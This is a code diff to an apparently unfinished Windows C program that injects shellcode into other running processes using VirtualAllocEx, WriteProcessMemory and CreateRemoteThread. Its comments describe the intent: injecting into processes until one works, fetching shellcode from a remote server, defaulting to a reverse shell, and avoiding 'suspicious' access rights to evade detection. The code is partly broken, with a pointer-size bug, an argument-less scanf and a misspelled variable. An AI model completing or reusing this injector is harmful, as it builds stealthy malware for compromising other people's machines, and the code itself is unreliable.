@@ -10,6 +10,10 @@ void	printListInfos(t_list_infos *list) {
 	}
 }
 
+void	printProcessInfos(t_pinfo process) {
+	printf("Process id: %d\n Process Handle: 0x%p\n Time64: %lld", process.pid, process.Hprocess, process.time64);
+}
+
 
 t_list_infos	*getProcessesList() {
 	int ownPid = _getpid();
@@ -93,40 +97,37 @@ int		main(int argc, char** argv) {
 
 	printListInfos(currentProcessesList);
 
-	return EXIT_SUCCESS;
-
-	// now we get list of all process we can go throught it and try to inject untill we succed, but
-	// when we inject we need to monitor that process so when it dies, we get another snapshot and we repeat.
-	// also the payload should no be static so i need to find a way to send the shellcode from node server or something.
-	// and trigger another snapshot and injection, but by default a reverse shell will do !
 
 	char *payload = "\x69\x69";
 	size_t payloadSize = sizeof(payload);
 
 
 	HANDLE HProcess = NULL;
-	int pid = atoi(argv[1]);
+	int pid = currentProcessesList->choosenProcess->pid;
+
+	printProcessInfos(currentProcessList->choosenProcess);
+	scanf();
 
 	// PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION
 	// Need to use the above permissions ! ALL_ACCESS is to suspecious.
-	if (!(HProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid))) {
-		printf("Couldn't get access to the provided process id, Error code %lx\n", GetLastError());
-		return EXIT_FAILURE;
-	}
+	// if (!(HProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid))) {
+	// 	printf("Couldn't get access to the provided process id, Error code %lx\n", GetLastError());
+	// 	return EXIT_FAILURE;
+	// }
 
 	LPVOID VMPointer = NULL;
 
-	if (!(VMPointer = VirtualAllocEx(HProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
+	if (!(VMPointer = VirtualAllocEx(currentProcessesList->choosenProcess->HProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
 		printf("Couldn't reserve/alloc memory in process virtualAddress, Error code %lx\n", GetLastError());
 		return EXIT_FAILURE;
 	}
 
-	printf("HProcess : 0x%p\nVMPointer : 0x%p\n", HProcess, VMPointer);
+	printf("HProcess : 0x%p\nVMPointer : 0x%p\n", currentProcessesList->choosenProcess->HProcess, VMPointer);
 
 	SIZE_T dataWritten = 0;
 	boolean wasDelivered = FALSE;
 
-	if (!(wasDelivered = WriteProcessMemory(HProcess, VMPointer, payload, payloadSize, &dataWritten))) {
+	if (!(wasDelivered = WriteProcessMemory(currentProcessesList->choosenProcess->HProcess, VMPointer, payload, payloadSize, &dataWritten))) {
 		printf("Couldn't deliver the playload, Error code %lx\n", GetLastError());
 		// need to brut-force !
 		return EXIT_FAILURE;
@@ -142,7 +143,7 @@ int		main(int argc, char** argv) {
 
 	DWORD dwThreadId = 0;
 
-	if (!(HThread = CreateRemoteThread(HProcess, NULL, 0, (LPTHREAD_START_ROUTINE)VMPointer, NULL, 0, &dwThreadId))) {
+	if (!(HThread = CreateRemoteThread(currentProcessesList->choosenProcess->HProcess, NULL, 0, (LPTHREAD_START_ROUTINE)VMPointer, NULL, 0, &dwThreadId))) {
 		printf("Couldn't summon a thread. to execute the payload, %lx\n", GetLastError());
 		return EXIT_FAILURE;
 	}
